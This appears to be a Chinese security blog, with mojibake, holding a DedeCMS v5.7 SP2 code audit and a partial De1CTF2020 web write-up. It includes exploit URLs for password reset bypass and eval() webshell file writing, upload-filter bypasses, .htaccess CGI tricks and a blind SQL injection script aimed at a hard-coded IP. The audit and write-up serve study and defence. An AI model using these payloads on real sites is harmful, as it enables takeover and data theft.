<p>åœ¨<code>member/resetpassword.php</code>75-99è¡Œï¼Œè¿›è¡Œå®‰å…¨é—®é¢˜çš„åˆ¤æ–­ã€‚é»˜è®¤<code>$row[&#39;safequestion&#39;]</code>åœ¨æ•°æ®åº“çš„å†…å®¹ä¸º<code>&#39;0&#39;</code>ï¼Œ<code>$row[&#39;safeanswer&#39;]</code>åœ¨æ•°æ®åº“ä¸­çš„ç»“æœä¸º<code>&#39;&#39;</code>ï¼Œä¸”å˜é‡<code>$safeanswer</code>ä¸<code>$safequestion</code>æ˜¯ç”¨æˆ·å¯æ§åˆ¶çš„å˜é‡ï¼Œåˆä½¿ç”¨äº† ==è¿›è¡Œåˆ¤æ–­ï¼Œ å› æ­¤è¯¥åˆ¤æ–­è§„åˆ™å­˜åœ¨å¼±ç±»å‹é—®é¢˜ã€‚å¦‚æœç”¨æˆ·åœ¨æ³¨å†Œæ—¶è®¾ç½®äº†å¯†ä¿é—®é¢˜åˆ™æ²¡æœ‰è¿™ä¸ªé—®é¢˜</p>
<p><img src="/2021/03/DedeCMSv5-7SP2ä»£ç å®¡è®¡/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-13%20151940.png" alt="å±å¹•æˆªå›¾ 2021-03-13 151940"></p>
<p>è¿™é‡Œæ‰“å°ä¸‹$row</p>
<p><img src="/2021/03/DedeCMSv5-7SP2ä»£ç å®¡è®¡/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-13%20153731.png" alt></p>
<p>å¯¹äº<code>$safeanswer</code>æˆ‘ä»¬ä¸ä¼ å€¼ï¼Œç»è¿‡85è¡Œå¤„ç†ä¹Ÿä¼šä¸ºç©ºï¼Œä»è€Œç›¸ç­‰ã€‚</p>
<p>å¯¹äº<code>$safequestion</code>æˆ‘ä»¬éœ€è¦ä¼ ä¸€ä¸ªå€¼ä½¿å…¶ç»•è¿‡<code>empyt()</code>ä¸”ç­‰äº<code>â€˜0â€™</code>ã€‚</p>
<p>æ ¹æ®æ‰‹å†Œï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ å‡º </p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">0.0</span>(ä½œä¸ºå­—ç¬¦ä¸²)</span><br><span class="line"><span class="number">0x0</span></span><br><span class="line"><span class="number">0e0</span></span><br><span class="line"><span class="number">0e1</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p><img src="/2021/03/DedeCMSv5-7SP2ä»£ç å®¡è®¡/image-20210313155728546.png" alt="image-20210313155728546"></p>
</li>
</ul>
<ul>
<li><p>æ¼æ´å¤ç°</p>
<p>å…ˆè¿›è¡Œå¦‚ä¸‹è¯·æ±‚è·å–key</p>
<p><code>/member/resetpassword.php?dopost=safequestion&amp;safequestion=0x0&amp;safeanswer=&amp;id=2</code> </p>
<p><img src="/2021/03/DedeCMSv5-7SP2ä»£ç å®¡è®¡/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-13%20160236.png" alt="å±å¹•æˆªå›¾ 2021-03-13 160236"></p>
</li>
</ul>
<p><img src="/2021/03/DedeCMSv5-7SP2ä»£ç å®¡è®¡/image-20210313160537171.png" alt="image-20210313160537171"></p>
<h3 id="ä»»æ„é‡ç½®åå°ç”¨æˆ·å¯†ç "><a href="#ä»»æ„é‡ç½®åå°ç”¨æˆ·å¯†ç " class="headerlink" title="ä»»æ„é‡ç½®åå°ç”¨æˆ·å¯†ç "></a><strong>ä»»æ„é‡ç½®åå°ç”¨æˆ·å¯†ç </strong></h3><ul>
<li><p>æ¼æ´åˆ†æ</p>
<p>åœ¨<code>member/edit_baseinfo.php</code> 118-123è¡Œä¿®æ”¹å‰ç«¯å¯†ç åŒæ—¶ä¹Ÿä¼šä¿®æ”¹åç«¯å¯†ç </p>
</li>
</ul>
<p><img src="/2021/03/DedeCMSv5-7SP2ä»£ç å®¡è®¡/image-20210313161155719.png" alt="image-20210313161155719"></p>
<h3 id="å‰å°ä»»æ„æ–‡ä»¶åˆ é™¤"><a href="#å‰å°ä»»æ„æ–‡ä»¶åˆ é™¤" class="headerlink" title="å‰å°ä»»æ„æ–‡ä»¶åˆ é™¤"></a><strong>å‰å°ä»»æ„æ–‡ä»¶åˆ é™¤</strong></h3><ul>
<li><p>æ¼æ´åˆ†æ</p>
<p>é—®é¢˜å‡ºåœ¨<code>member/inc/inc_batchup.php</code>çš„<code>DelArc</code>æ–¹æ³•ï¼Œå¯¹äº<code>$licp[&#39;litpic&#39;]</code>ç›´æ¥æ‹¼æ¥åœ¨ç›®å½•åé¢åªæ£€æµ‹æ–‡ä»¶å­˜ä¸å­˜åœ¨ï¼Œæ²¡æœ‰æ£€æŸ¥æ–‡ä»¶ç±»å‹å°±ç›´æ¥åˆ é™¤ã€‚é‡ç‚¹åœ¨äºè¿™ä¸ª<code>litpic</code>æˆ‘ä»¬æ˜¯å¦å¯æ§</p>
<p><img src="/2021/03/DedeCMSv5-7SP2ä»£ç å®¡è®¡/image-20210313204533734.png" alt="image-20210313204533734"></p>
<p>æ¥ç€å…¨å±€æœç´¢äº†<code>litpic</code>å˜é‡ï¼Œå‘ç°<code>member/inc/archives_check_edit.php</code>å‘ç°79-93è¡Œå¯ä»¥é€šè¿‡æ§åˆ¶<code>$oldlitpic</code>æ¥<code>litpic</code>ã€‚åœ¨<code>$litpic</code>ä¸ºç©ºçš„æƒ…å†µä¸‹ï¼Œ<code>$litpic=$oldlitpic</code>ã€‚</p>
<p><img src="/2021/03/DedeCMSv5-7SP2ä»£ç å®¡è®¡/image-20210314155059165.png" alt="image-20210314155059165"></p>
<p>æ¥ç€å…¨å±€æœç´¢<code>archives_check_edit</code></p>
<p><img src="/2021/03/DedeCMSv5-7SP2ä»£ç å®¡è®¡/image-20210314152654346.png" alt="image-20210314152654346"></p>
<p>ä¹Ÿå°±æ˜¯è¿™å››ä¸ªåŠŸèƒ½å—å½±å“</p>
<p><img src="/2021/03/DedeCMSv5-7SP2ä»£ç å®¡è®¡/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-14%20155544.png" alt="å±å¹•æˆªå›¾ 2021-03-14 155544"></p>
<p>è€Œåœ¨ä¸Šä¼ å›¾é›†çš„åŠŸèƒ½é‡Œï¼ŒåŒæ ·å¯æ§<code>litpic</code> åœ¨<code>member/album_add.php</code> 88-103è¡Œï¼Œåœ¨<code>$formhtml==1 &amp;&amp; $ddisfirst==1 &amp;&amp; $litpic==&#39;&#39; &amp;&amp; !empty($litpicname)</code>ä¸‹<code>$litpic==$litpicname</code></p>
<p><img src="/2021/03/DedeCMSv5-7SP2ä»£ç å®¡è®¡/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-14%20160450.png" alt="å±å¹•æˆªå›¾ 2021-03-14 160450"></p>
<p><code>$formhtml</code>å¯ä¼ å‚æ§åˆ¶ï¼Œ<code>$ddisfirst</code>é»˜è®¤ä¸º1,è‡³äº<code>$litpic</code>æˆ‘ä»¬è·Ÿè¿›<code>archives_check.php</code>ï¼Œåœ¨100-102è¡Œ</p>
<p><img src="/2021/03/DedeCMSv5-7SP2ä»£ç å®¡è®¡/image-20210314161257476.png" alt="image-20210314161257476"></p>
<p>è·Ÿè¿›<code>MemberUploads</code>æ–¹æ³•ï¼Œåœ¨<code>include/helpers/upload.helper.php</code> 118-240è¡Œï¼Œå…¶ä¸­215-222è¡Œæ˜¯å…³é”®åœ¨ä¸ä¸Šä¼ ç¼©ç•¥å›¾çš„æƒ…å†µä¸‹ä¼šè¿›å…¥elseåˆ†æ”¯ï¼ŒåŒæ—¶<code>MemberUploads</code>çš„<code>handname</code>å‚æ•°é»˜è®¤ä¸ºç©ºã€‚å³è¿”å›å€¼ä¹Ÿä¸ºç©ºã€‚æ‰€ä»¥<code>$litpic</code>å¯æ§</p>
<p><img src="/2021/03/DedeCMSv5-7SP2ä»£ç å®¡è®¡/image-20210314161619071.png" alt="image-20210314161619071"></p>
<p>æœ€åå…¨å±€æœç´¢<code>DelArc</code>å‡½æ•°æŸ¥æ‰¾è§¦å‘ç‚¹ï¼Œåœ¨<code>member/archives_do.php</code>ï¼Œæœ‰ä¸ª<code>issystem</code>çš„åˆ¤æ–­</p>
<p><img src="/2021/03/DedeCMSv5-7SP2ä»£ç å®¡è®¡/image-20210314162605298.png" alt="image-20210314162605298"></p>
<p>æ•°æ®åº“æŸ¥è¯¢ä¸€ä¸‹ï¼Œé»˜è®¤æƒ…å†µä¸‹å‡ºäº†<code>infos</code>å…¶ä»–éƒ½ä¼šè°ƒç”¨<code>DelArc</code>åˆ é™¤æ–‡ä»¶ã€‚</p>
<p><img src="/2021/03/DedeCMSv5-7SP2ä»£ç å®¡è®¡/image-20210314162729095.png" alt="image-20210314162729095"></p>
</li>
<li><p>æ¼æ´å¤ç°</p>
<p>æƒ…å†µä¸€ï¼š</p>
<p>ä»¥æ–‡ç« ä¸ºä¾‹ </p>
<p>å…ˆå‘è¡¨æ–‡ç« ï¼Œå†…å®¹éšæ„å¡«</p>
<p><img src="/2021/03/DedeCMSv5-7SP2ä»£ç å®¡è®¡/image-20210314164413817.png" alt="image-20210314164413817"></p>
<p>å†ä¿®æ”¹æ–‡ç« åŒæ—¶åŠ ä¸Š<code>oldlitpic</code>çš„å€¼</p>
<p><img src="/2021/03/DedeCMSv5-7SP2ä»£ç å®¡è®¡/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-14%20164614.png" alt="å±å¹•æˆªå›¾ 2021-03-14 164614"></p>
<p>æ•°æ®åº“ï¼š</p>
<p><img src="/2021/03/DedeCMSv5-7SP2ä»£ç å®¡è®¡/image-20210314164927927.png" alt="image-20210314164927927"></p>
<p>æœ€ååˆ é™¤æ–‡ç« å³å¯åˆ é™¤<code>oldlitpic</code>æŒ‡å‘çš„æ–‡ä»¶ã€‚</p>
<p><img src="/2021/03/DedeCMSv5-7SP2ä»£ç å®¡è®¡/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-14%20165328.png" alt="å±å¹•æˆªå›¾ 2021-03-14 165328"></p>
<p>æƒ…å†µäºŒï¼š</p>
<p>ä¸Šä¼ å›¾é›†æ—¶æ·»åŠ <code>formhtml</code>å’Œ<code>litpicname</code>å³å¯</p>
<p><img src="/2021/03/DedeCMSv5-7SP2ä»£ç å®¡è®¡/image-20210314165944131.png" alt="image-20210314165944131"></p>
<p>åˆ é™¤å›¾é›†</p>
<p><img src="/2021/03/DedeCMSv5-7SP2ä»£ç å®¡è®¡/image-20210314170320939.png" alt="image-20210314170320939"></p>
</li>
</ul>
<h3 id="å‰å°ä»»æ„æ–‡ä»¶ä¸Šä¼ "><a href="#å‰å°ä»»æ„æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="å‰å°ä»»æ„æ–‡ä»¶ä¸Šä¼ "></a><strong>å‰å°ä»»æ„æ–‡ä»¶ä¸Šä¼ </strong></h3><ul>
<li><p>æ¼æ´åˆ†æ</p>
<p>ä¸Šä¼ éœ€è¦adminæƒé™ï¼Œæœ‰ç‚¹é¸¡è‚‹ã€‚ä½†é…åˆä¹‹å‰çš„cookieä¼ªé€ ä¹Ÿè¿˜è¡Œã€‚</p>
<p>é—®é¢˜åœ¨<code>include/dialog/select_images_post.php</code>å¯¹äºåç¼€çš„å¤„ç†é€»è¾‘æœ‰é—®é¢˜ã€‚åœ¨36è¡Œè·å–æ–‡ä»¶å,ç„¶åè¿‡æ»¤ã€‚</p>
<p><img src="/2021/03/DedeCMSv5-7SP2ä»£ç å®¡è®¡/image-20210316211925145.png" alt="image-20210316211925145"></p>
<p>è¿™ä¸ªæ–‡ä»¶åå°±æ˜¯æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶åï¼Œå…·ä½“çš„è°ƒç”¨æ˜¯</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">select_images_post</span><span class="selector-class">.php</span> <span class="selector-tag">-</span>&gt; <span class="selector-tag">config</span><span class="selector-class">.php</span> <span class="selector-tag">-</span>&gt; <span class="selector-tag">common</span><span class="selector-class">.inc</span><span class="selector-class">.php</span> <span class="selector-tag">-</span>&gt;  <span class="selector-tag">uploadsafe</span><span class="selector-class">.inc</span><span class="selector-class">.php</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/03/DedeCMSv5-7SP2ä»£ç å®¡è®¡/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-16%20212521.png" alt="å±å¹•æˆªå›¾ 2021-03-16 212521"></p>
<p>æ¥ç€åœ¨58åˆ°64è¡Œè¿›è¡Œåç¼€æ‹¼æ¥å’Œä¸Šä¼ ã€‚ç›´æ¥é€šè¿‡<code>.</code>æ¥åˆ†å‰²æ–‡ä»¶åï¼Œå°†æœ€åä¸€ä¸ªåç¼€ä½œä¸ºæ–‡ä»¶åç¼€ã€‚</p>
<p><img src="/2021/03/DedeCMSv5-7SP2ä»£ç å®¡è®¡/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-16%20212843.png" alt="å±å¹•æˆªå›¾ 2021-03-16 212843"></p>
<p>é€šè¿‡æ„é€ ç±»ä¼¼</p>
<figure class="highlight erlang"><table><tr><td class="code"><pre><span class="line">p<span class="comment">%hp</span></span><br><span class="line">p*hp</span><br><span class="line">p&lt;hp</span><br><span class="line">p?hp</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>å³å¯ç»•è¿‡ä¸Šä¼ ã€‚</p>
</li>
<li><p>æ¼æ´åˆ©ç”¨</p>
<p><img src="/2021/03/DedeCMSv5-7SP2ä»£ç å®¡è®¡/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-16%20213715.png" alt="å±å¹•æˆªå›¾ 2021-03-16 213715"></p>
<p><img src="/2021/03/DedeCMSv5-7SP2ä»£ç å®¡è®¡/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-16%20215140.png" alt="å±å¹•æˆªå›¾ 2021-03-16 215140"></p>
</li>
</ul>
<p><img src="/2021/03/DedeCMSv5-7SP2ä»£ç å®¡è®¡/image-20210316215503126.png" alt="image-20210316215503126"></p>
<h3 id="åå°æ–‡ä»¶å†™å…¥"><a href="#åå°æ–‡ä»¶å†™å…¥" class="headerlink" title="åå°æ–‡ä»¶å†™å…¥"></a>åå°æ–‡ä»¶å†™å…¥</h3><ul>
<li><p>æ¼æ´åˆ†æ</p>
<p>åˆæ˜¯éœ€è¦åå°adminæƒé™ï¼Œå¤ªé¸¡è‚‹äº†ã€‚DedeCMSåå°æœ¬æ¥å°±å¸¦æœ‰æ–‡ä»¶ç®¡ç†å™¨ï¼Œæœ¬ç€å­¦ä¹ çš„æ€åº¦å°±è®°å½•ä¸€ä¸‹ã€‚</p>
<p>é—®é¢˜å‡ºåœ¨<code>dede/sys_verifies.php</code>ï¼Œ<code>fwrite</code>çš„å‚æ•°æœªç»è¿‡è¿‡æ»¤ï¼Œå¯¼è‡´æ–‡ä»¶å†™å…¥ï¼Œé…åˆ<code>require_once</code>getshell</p>
</li>
</ul>
<p><img src="/2021/03/DedeCMSv5-7SP2ä»£ç å®¡è®¡/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-17%20190619.png" alt="å±å¹•æˆªå›¾ 2021-03-17 190619"></p>
<p><img src="/2021/03/DedeCMSv5-7SP2ä»£ç å®¡è®¡/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-17%20191424.png" alt="å±å¹•æˆªå›¾ 2021-03-17 191424"></p>
<ul>
<li><p>æ¼æ´å¤ç°</p>
<p>è®¿é—®<code>/dede/sys_verifies.php?action=getfiles&amp;refiles[]=\&quot;;eval($_GET[a]);die();//</code> å†™å…¥æ–‡ä»¶</p>
<p><img src="/2021/03/DedeCMSv5-7SP2ä»£ç å®¡è®¡/image-20210317191752815.png" alt="image-20210317191752815"></p>
<p>è®¿é—®<code>/dede/sys_verifies.php?action=down&amp;a=phpinfo();</code>æ‰§è¡Œå‘½ä»¤</p>
<p><img src="/2021/03/DedeCMSv5-7SP2ä»£ç å®¡è®¡/image-20210317191855712.png" alt="image-20210317191855712"></p>
</li>
</ul>
<h3 id="åå°äºŒæ¬¡æ³¨å…¥getshell"><a href="#åå°äºŒæ¬¡æ³¨å…¥getshell" class="headerlink" title="åå°äºŒæ¬¡æ³¨å…¥getshell"></a>åå°äºŒæ¬¡æ³¨å…¥getshell</h3><ul>
<li><p>æ¼æ´åˆ†æ</p>
<p>åœ¨<code>dede/ad_add.php</code>80-83è¡Œï¼Œå‚æ•°<code>$normbody</code>æœªç»è¿‡æ»¤å°±æ”¾å…¥æ•°æ®åº“ä¸­</p>
<p><img src="/2021/03/DedeCMSv5-7SP2ä»£ç å®¡è®¡/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-17%20193957.png" alt="å±å¹•æˆªå›¾ 2021-03-17 193957"></p>
<p>è€Œåœ¨<code>plus/ad_js.php</code> 21-44è¡Œï¼ŒæŸ¥è¯¢ç»“æœç›´æ¥åŒ…å«ã€‚</p>
<p><img src="/2021/03/DedeCMSv5-7SP2ä»£ç å®¡è®¡/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-17%20194249.png" alt="å±å¹•æˆªå›¾ 2021-03-17 194249"></p>
</li>
<li><p>å¤ç°æ¼æ´</p>
<p><img src="/2021/03/DedeCMSv5-7SP2ä»£ç å®¡è®¡/image-20210317194532192.png" alt="image-20210317194532192"></p>
</li>
</ul>
<p>  <img src="/2021/03/DedeCMSv5-7SP2ä»£ç å®¡è®¡/image-20210317194553335.png" alt="image-20210317194553335"></p>
<h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="https://www.freebuf.com/column/161703.html" target="_blank" rel="noopener">https://www.freebuf.com/column/161703.html</a></p>
<p><a href="https://www.cnblogs.com/zpchcbd/p/12741373.html" target="_blank" rel="noopener">https://www.cnblogs.com/zpchcbd/p/12741373.html</a></p>
]]></content>
      <categories>
        <category>ä»£ç å®¡è®¡</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>CMS</tag>
      </tags>
  </entry>
  <entry>
    <title>De1CTF2020-å¤ç°</title>
    <url>/2020/05/De1CTF2020-%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h4 id="1-check-in"><a href="#1-check-in" class="headerlink" title="1.check in"></a>1.check in</h4><p>é¢˜ç›®è¿‡æ»¤å¾ˆå¤šå…³é”®å­—</p><p><img src="/2020/05/De1CTF2020-å¤ç°/image-20200507215250934.png" alt="image-20200507215250934"></p><p>é¦–å…ˆæƒ³åˆ°çš„æ˜¯ä¸Šä¼ .htaccessä½†æ˜¯æŠŠphç»™è¿‡æ»¤äº†ï¼Œåé¢æƒ³ä¸Šä¼ user.ini ä½†autoè¢«ç¦äº†</p><p>åé¢çœ‹äº†<a href="https://www.cnblogs.com/20175211lyz/p/11741348.html" target="_blank" rel="noopener">è¿™ç¯‡æ–‡ç« </a>åˆ©ç”¨ æ¢è¡Œç¬¦â€&quot;ç»•è¿‡ph</p><p><img src="/2020/05/De1CTF2020-å¤ç°/image-20200507215853923.png" alt="image-20200507215853923"></p><p><img src="/2020/05/De1CTF2020-å¤ç°/image-20200507215952735.png" alt="image-20200507215952735"></p><p><img src="/2020/05/De1CTF2020-å¤ç°/image-20200507215058705.png" alt="image-20200507215058705"></p><p>ä½†è¿™é¢˜çš„é¢„æœŸè§£æ˜¯ä¸Šä¼ .htaccess</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Options +ExecCGI</span><br><span class="line">AddHandler cgi-script .sh</span><br></pre></td></tr></table></figure><a id="more"></a>









<p> è§£æshellè„šæœ¬</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Content-Type: text/plain"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">""</span></span><br><span class="line">cat /flag</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>

<p>å¯è¿™é¢˜çš„æœ‰å‘ï¼Œå®˜æ–¹å¤ç°è¯´linuxä¸­cgiæ¯”è¾ƒä¸¥æ ¼ï¼Œåœ¨windowä¸‹ç¼–è¾‘è„šæœ¬ä¼šå› ä¸ºç¼–ç é—®é¢˜æœåŠ¡å™¨è§£æå¤±è´¥ï¼Œå¿…é¡»åœ¨linuxç¯å¢ƒä¸‹ç¼–è¾‘è„šæœ¬å†ä¸Šä¼ ã€‚</p>
<p>è¿˜æœ‰ä¸€ä¸ªéé¢„æœŸæ˜¯ç›´æ¥ä¸Šåˆ«äººçš„è½¦ã€‚ã€‚ã€‚</p>
<p>ä¸Šä¼ .htaccess</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute"><span class="nomarkup">SetHandler</span></span> server-status</span><br></pre></td></tr></table></figure>

<p>æ‰“å¼€è‡ªå·±çš„ä¸Šä¼ å°±èƒ½çœ‹åˆ°apacheçš„æœåŠ¡å™¨çŠ¶æ€ï¼Œå¯ä»¥çœ‹åˆ°å…¶ä»–äººçš„è®¿é—®ç½‘ç«™çš„è®°å½•ï¼Œç„¶åç™½å«–flag</p>
<p>è¿™åº”è¯¥æ˜¯åé¢ä¸ºå•¥5åˆ†é’Ÿé‡å¯ä¸€æ¬¡æœåŠ¡çš„åŸå› å§</p>
<h4 id="2-Mixture"><a href="#2-Mixture" class="headerlink" title="2.Mixture"></a>2.Mixture</h4><p>åœ¨member.phpçš„htmlæºç ä¸­æœ‰orderbyæ³¨é‡Šï¼Œåº”è¯¥æ˜¯sqlæ³¨å…¥adminçš„å¯†ç </p>
<p>æµ‹è¯•è¿‡æ»¤çš„å…³é”®å­— hex unhex desc exp è¿˜æœ‰ä¸‹é¢çš„</p>
<p><img src="/2020/05/De1CTF2020-å¤ç°/image-20200507221939844.png" alt="image-20200507221939844"></p>
<p>ç›²æ³¨è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://134.175.185.244/index.php"</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">"username"</span>:<span class="string">"xxxxx"</span>,</span><br><span class="line">    <span class="string">"password"</span>:<span class="string">"xxxxxxx"</span>,</span><br><span class="line">    <span class="string">"submit"</span>:<span class="string">"submit"</span></span><br><span class="line">&#125;</span><br><span class="line">cookie =&#123;</span><br><span class="line">    <span class="string">"PHPSESSID"</span>: <span class="string">"sou26piclav6f99h79k1l5vmbn"</span></span><br><span class="line">&#125;</span><br><span class="line">requests.post(url,data=data,cookies=cookie)</span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line">url=<span class="string">"http://134.175.185.244/member.php?orderby="</span></span><br><span class="line">sql=<span class="string">'select database()'</span> <span class="comment">#test </span></span><br><span class="line">sql = <span class="string">"select group_concat(table_name) from information_schema.tables where table_schema=database()"</span><span class="comment">#member,users</span></span><br><span class="line">sql = <span class="string">'select group_concat(column_name) from information_schema.columns where table_schema=database()'</span> <span class="comment">#id, username, password</span></span><br><span class="line">sql = <span class="string">'select password from member'</span> <span class="comment">#18a960a3a0b3554b314ebe77fe545c85</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">'0123456789abcdefghijklmnopqrstuvwxyz,'</span>:</span><br><span class="line">        payload=<span class="string">"|(mid((&#123;&#125;),&#123;&#125;,1)='&#123;&#125;')%2b1"</span>.format(sql,i,j)</span><br><span class="line">        true_url=url+payload</span><br><span class="line">        r=requests.get(true_url,cookies=cookie)</span><br><span class="line">        <span class="keyword">if</span> r.content.index(<span class="string">'tom'</span>)&lt;r.content.index(<span class="string">'1000000'</span>):</span><br><span class="line">            <span class="keyword">print</span> payload+<span class="string">' ok'</span></span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="keyword">print</span> flag</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> payload</span><br><span class="line"><span class="comment">#18a960a3a0b3554b314ebe77fe545c85</span></span><br></pre></td></tr></table></figure>

<p>è·‘å‡ºæ¥çš„å¯†ç ç»è¿‡md5è§£å¯†æ˜¯goodlucktoyou</p>
<p>è¿™é‡Œè®¨è®ºä»¥ä¸‹å…¶ä»–å¸ˆå‚…çš„payloadå­¦ä¹ ä¸€ä¸‹</p>
<p>çœ‹åˆ°æ’åæ˜¯æ˜¯æŒ‰ç…§IDå¤§å°æ’çš„ï¼Œæ‰€ä»¥çŒœæµ‹åå°sqlè¯­å¥åº”è¯¥æ˜¯</p>
<p><code>select * from users order by id</code> + orderbyä¼ å‚</p>
<p>ç„¶åæµ‹è¯•</p>
<p>orderby=|2 å‘ç°æ’åå˜äº†ï¼Œè¿™å°±æ˜¯å…³é”®ç‚¹äº†</p>
<p><code>select * from users order by id | 2</code></p>
<p><code>select * from users order by (id | 2)</code></p>
<p>æ’åºæ˜¯æŒ‰ä½æˆ–ä¹‹åæ’åºçš„ä¸¾ä¸ªä¾‹å­</p>
<p><img src="/2020/05/De1CTF2020-å¤ç°/image-20200514204948437.png" alt="image-20200514204948437"></p>
<p>ç»“æœä¸­ 2|2 æœ€å° æ’ç¬¬ä¸€ å…¶ä»–ä¸å˜ä¹Ÿå°±æ˜¯ 2 1 3 4 </p>
<p><img src="/2020/05/De1CTF2020-å¤ç°/image-20200514205159803.png" alt="image-20200514205159803"></p>
<p><a href="https://www.gem-love.com/ctf/2302.html" target="_blank" rel="noopener">y1ng</a>å¸ˆå‚…ç”¨çš„æ˜¯æ—¶é—´ç›²æ³¨</p>
<p>æ ¸å¿ƒpayloadæ˜¯</p>
<p><code>and case when (FIELD(substr((select database()),0,1),t)=1) then (benchmark(100000,sha1(sha(sha(1)))))end</code></p>
<p>fieldæ˜¯mysqlçš„ä¸€ä¸ªè‡ªå®šä¹‰æ’åºå‡½æ•°ï¼Œ</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">field</span><span class="params">(value,str1,str2,str3,str4)</span></span></span><br></pre></td></tr></table></figure>

<p>valueä¸str1ã€str2ã€str3ã€str4æ¯”è¾ƒï¼Œè¿”å›1ã€2ã€3ã€4ï¼Œå¦‚é‡åˆ°nullæˆ–è€…ä¸åœ¨åˆ—è¡¨ä¸­çš„æ•°æ®åˆ™è¿”å›0. </p>
<p>åˆ©ç”¨adminç™»å…¥åï¼Œåˆ©ç”¨phpinfoçš„è·¯å¾„ä¿¡æ¯searchåŠŸèƒ½ä¸‹è½½æºç </p>
<p>å‘ç°select.php è°ƒç”¨äº†ä¸ªMinclude</p>
<p><img src="/2020/05/De1CTF2020-å¤ç°/image-20200514225953158.png" alt="image-20200514225953158"></p>
<p>æ¥ç€åœ¨phpinfo å‘ç°äº†Mincludeçš„æ‰©å±•</p>
<p>æ‰¾åˆ°soæ‰©å±•ç›®å½•ï¼Œä¸‹è½½Mniclude.so</p>
<p><img src="/2020/05/De1CTF2020-å¤ç°/image-20200514225752470.png" alt="image-20200514225752470"></p>
<p><img src="/2020/05/De1CTF2020-å¤ç°/image-20200514230159673.png" alt="image-20200514230159673"></p>
<p>æ¥ä¸‹æ¥å°±ä¸æ˜¯webç‹—çš„äº‹äº†</p>
<h4 id="3-Hard-Pentest-1"><a href="#3-Hard-Pentest-1" class="headerlink" title="3.Hard_Pentest_1"></a>3.Hard_Pentest_1</h4><p>åŸŸæ¸—é€å¤ªé¡¶äº†ï¼Œåªèƒ½èµ›åè·Ÿç€wpå†…ç½‘æ¼«æ¸¸</p>
<p>æ–‡ä»¶ä¸Šä¼ æ–‡ä»¶åä¸èƒ½åŒ…å« <code>..\</code> æ–‡ä»¶å†…å®¹å†…å®¹ä¸èƒ½åŒ…å« <code>æ•°å­—å­—æ¯;~^&amp;|\åå¼•å·</code></p>
<p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯è¿™æ˜¯ä¸€ä¸ªwindowæœåŠ¡å™¨</p>
<p>æ–‡ä»¶åç»•è¿‡</p>
<p>1.åˆ©ç”¨windowå¯¹äºæ–‡ä»¶å’Œæ–‡ä»¶åçš„é™åˆ¶ï¼Œåœ¨ä»¥<code>::$DATA</code>å­—ç¬¦æ”¾åœ¨ç»“å°¾æ—¶ï¼Œä¸ç¬¦åˆæ“ä½œç³»ç»Ÿå‘½åè§„èŒƒï¼Œåœ¨æœ€åç”Ÿæˆæ–‡ä»¶æ—¶ï¼Œå­—ç¬¦ä¼šè¢«è‡ªåŠ¨åˆ é™¤</p>
<p>2.åˆ©ç”¨windowä¸åŒºåˆ†å¤§å°å†™ç»•è¿‡</p>
<p>æ–‡ä»¶å†…å®¹ç»•è¿‡å¯ä»¥å‚è€ƒPç¥çš„æ— æ•°å­—å­—æ¯webshellï¼Œåˆ©ç”¨phpçŸ­æ ‡ç­¾ç»•è¿‡ <code>;</code></p>
